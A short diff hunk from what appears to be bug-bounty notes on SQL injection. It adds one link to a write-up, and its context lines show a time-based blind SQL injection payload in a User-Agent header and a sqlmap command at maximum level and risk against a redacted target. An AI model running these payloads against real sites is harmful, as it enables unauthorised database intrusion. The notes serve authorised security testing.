@@ -32,4 +32,6 @@ User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"
 u can hunt post based param when if the URL has POST /hello/string/testing.php HTTP/1.1
  
 python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent  -u https://█████████ --data="████████&██████" -p username --dbms=mysql 
+
+* https://infosecwriteups.com/how-i-found-multiple-sql-injections-in-5-minutes-in-bug-bounty-40155964c498
   
